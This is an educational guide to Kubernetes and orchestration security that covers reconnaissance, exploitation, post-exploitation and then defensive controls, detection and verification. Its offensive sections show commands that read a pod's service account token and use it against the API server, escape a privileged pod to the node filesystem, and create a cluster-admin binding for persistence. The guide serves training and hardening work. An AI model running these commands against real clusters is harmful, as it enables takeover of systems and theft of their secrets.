# Orchestration Fundamentals

Orchestration is the layer that turns a set of machines into a single
scheduling surface. It decides where a workload runs, restarts it when it
fails, exposes it to the network, and gives it an identity. Kubernetes,
Docker Swarm, HashiCorp Nomad and CI/CD runners are all orchestrators: they
accept a declarative description of desired state and reconcile reality
toward it.

The security model follows from that definition. An orchestrator is a
control plane with the authority to create processes, mount storage, and
attach network identities across many hosts. Whoever controls the
orchestrator controls every workload it manages. The offensive goal is
therefore rarely a single container - it is the path from a workload into
the control plane, or from the control plane into every workload.

## 1. Overview

An orchestrator has three logical planes:

- **Control plane** - the API server, scheduler, controller manager and the
  key-value store that holds cluster state (etcd in Kubernetes).
- **Data plane** - the workloads themselves, plus the agents on each node
  that run them (kubelet and container runtime in Kubernetes).
- **Management plane** - the human and machine interfaces: dashboards,
  CI/CD pipelines, kubectl credentials, cloud IAM that grants cluster
  access.

The reconciliation loop is the core abstraction. An operator submits
desired state to the API server; controllers compare desired state with
observed state and issue the actions needed to close the gap. If an
attacker can write to the API server, they are not "running a command" -
they are declaring a new desired state that the cluster will faithfully
enforce.

Three orchestration models matter for this subcategory:

- **Kubernetes** - the dominant model. Declarative, API-driven, with a
  pluggable admission layer and a very large attack surface.
- **Docker Swarm and Nomad** - simpler schedulers. Fewer moving parts,
  different trust boundaries, still worth knowing.
- **CI/CD orchestration** - pipelines that hold deployment credentials and
  can push into a cluster. Often the weakest link in the chain.

## 2. Reconnaissance / Enumeration

Enumeration of an orchestration platform starts with identifying which
platform is present and which interfaces are exposed.

Indicators of Kubernetes:

- Port 6443 (API server), 10250 (kubelet), 2379-2380 (etcd), 10255
  (read-only kubelet, legacy).
- HTTP response headers or `/version` output revealing `gitVersion`.
- DNS names such as `kubernetes.default.svc` inside a pod.
- A mounted service account token at
  `/var/run/secrets/kubernetes.io/serviceaccount/token`.

Indicators of Swarm or Nomad:

- Docker Engine with `Swarm: active` in `docker info`.
- Nomad HTTP API on port 4646, with `/v1/agent/self` returning agent
  configuration.

From inside a compromised workload, the highest-value enumeration is the
service account and its permissions:

```bash
# Kubernetes: what can this pod's identity do?
kubectl auth can-i --list
kubectl get secrets -A
kubectl get pods -A -o wide
```

Expected output:

```text
Resources   Non-Resource URLs   Resource Names   Verbs
pods        []                  []               [get list]
secrets     []                  []               [get]
```

The listing shows the effective RBAC of the current identity. A workload
that can `get secrets` cluster-wide is already a control-plane foothold.

## 3. Common Attack Vectors

The attack surface of an orchestrator is concentrated in four places.

**Exposed API server.** An API server reachable from the internet with
anonymous or weakly authenticated access is a direct control-plane
compromise. Misconfigured `--anonymous-auth=true` or a permissive
`system:unauthenticated` binding turns enumeration into takeover.

**Over-privileged workloads.** Pods that run with a mounted service
account token, `hostPath` volumes, `hostNetwork: true`, or
`privileged: true` give an attacker a path from the workload into the node
and often into the cluster.

**Supply chain into the cluster.** Anyone who can push an image or modify
a manifest that the cluster will deploy controls code execution inside
the cluster. CI/CD credentials, image registries and Git repositories are
all part of the orchestration trust boundary.

**Misconfigured admission and RBAC.** A cluster without admission policy
accepts manifests that grant themselves more privilege; an RBAC model
that grants wildcard verbs to service accounts collapses the boundary
between workload and control plane.

## 4. Exploitation Recipes

The classic path from a compromised pod to cluster control:

```bash
# 1. Confirm the mounted service account token exists
cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40; echo

# 2. Use it against the API server from inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

Expected output (trimmed):

```text
{
  "kind": "PodList",
  "items": [
    { "metadata": { "name": "web-0", ... } }
  ]
}
```

The API server accepted the workload identity. From here the recipe
depends on RBAC: read secrets, create pods, or escalate through a
privileged workload.

A second common recipe is abuse of a privileged pod to reach the node:

```bash
# Inside a privileged pod
mount /dev/sda1 /mnt
chroot /mnt /bin/bash
```

If the container runtime allows `privileged: true`, this reaches the node
filesystem and from there the kubelet credentials.

## 5. Post-Exploitation

Once the control plane is reached, the goal is persistence and reach:

- Create a new service account bound to `cluster-admin`.
- Deploy a DaemonSet that runs on every node, giving code execution
  cluster-wide.
- Read secrets for cloud credentials and pivot into the cloud account.
- Modify admission webhooks or controllers so that future legitimate
  workloads carry attacker code.

A DaemonSet is the most reliable cluster-wide persistence primitive:

```bash
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:attacker
```

Expected output:

```text
clusterrolebinding.rbac.authorization.k8s.io/attacker-admin created
```

## 6. Risk Context (Offensive)

The blast radius of an orchestration compromise is the union of every
workload, secret and cloud identity the cluster holds. This is why
orchestrators attract attackers: a single control-plane foothold
collapses dozens of per-service trust boundaries at once.

The realistic threat models are:

- A compromised application pod escalating to the cluster.
- A leaked CI/CD credential deploying attacker-controlled manifests.
- A misconfigured public API server or kubelet with weak auth.
- A malicious image or chart that ships cluster-admin bindings.

Each model maps to a different control: workload hardening, pipeline
security, API exposure review, and supply chain policy.

## 7. Root Causes (Defensive)

Most orchestration compromises trace to one of four root causes:

- **Default permissiveness.** The cluster was deployed with sample
  manifests that grant broad RBAC or disable admission.
- **Identity sprawl.** Every workload receives a token; nobody reviews
  what each token can do.
- **Untrusted admission.** Manifests are accepted without policy, so a
  workload can grant itself more privilege than intended.
- **Pipeline trust.** The CI/CD system holds cluster credentials and is
  not itself hardened to the same standard as the cluster.

## 8. Preventive Controls (Defensive)

- Enforce RBAC least privilege; no wildcard verbs, no default
  `cluster-admin` bindings.
- Disable automounting of service account tokens where the workload does
  not need the API (`automountServiceAccountToken: false`).
- Apply admission policy (Pod Security Standards, OPA Gatekeeper, Kyverno)
  to reject privileged, hostPath and hostNetwork workloads.
- Restrict API server and kubelet exposure to trusted networks.
- Harden the CI/CD system: short-lived credentials, OIDC federation,
  protected branches, and review of every manifest change.

## 9. Detection Controls (Defensive)

- Audit log the API server and alert on creation of `cluster-admin`
  bindings, new DaemonSets, and changes to admission webhooks.
- Alert on service account token use from unexpected source IPs or
  namespaces.
- Monitor for `kubectl exec` and `kubectl port-forward` bursts against
  production workloads.
- Detect new pods with `privileged: true`, `hostPath`, or `hostNetwork`
  in namespaces that should never run them.
- Correlate CI/CD deployment events with Git history: a deploy with no
  matching commit is a red flag.

## 10. Verification (Defensive)

A hardening review of an orchestrator is verifiable:

- Run an RBAC audit (for example `kubectl auth can-i --list` for every
  service account) and confirm no identity holds unintended verbs.
- Submit a deliberately privileged manifest and confirm admission policy
  rejects it.
- Verify service account token automounting is disabled for workloads that
  do not call the API.
- Confirm API server audit logging is enabled and shipped off-node.
- Confirm CI/CD credentials are short-lived and scoped to a single
  namespace or cluster.

## Certification Alignment

- **CKA / CKS** - cluster architecture, RBAC, admission control,
  workload isolation, supply chain security.
- **AWS Certified Security - Specialty** - EKS control plane exposure,
  IAM-to-RBAC mapping, audit logging.
- **CompTIA Cloud+** - orchestration models, cluster security fundamentals.

## References

- Kubernetes Documentation - https://kubernetes.io/docs/
- Kubernetes API concepts - https://kubernetes.io/docs/reference/using-api/
- Pod Security Standards - https://kubernetes.io/docs/concepts/security/pod-security-standards/
- NIST SP 800-190, Application Container Security Guide - https://csrc.nist.gov/pubs/sp/800/190/final
- NIST SP 800-204A, Building Secure Microservices-based Applications Using Service-Mesh Architecture - https://csrc.nist.gov/pubs/sp/800/204/a/final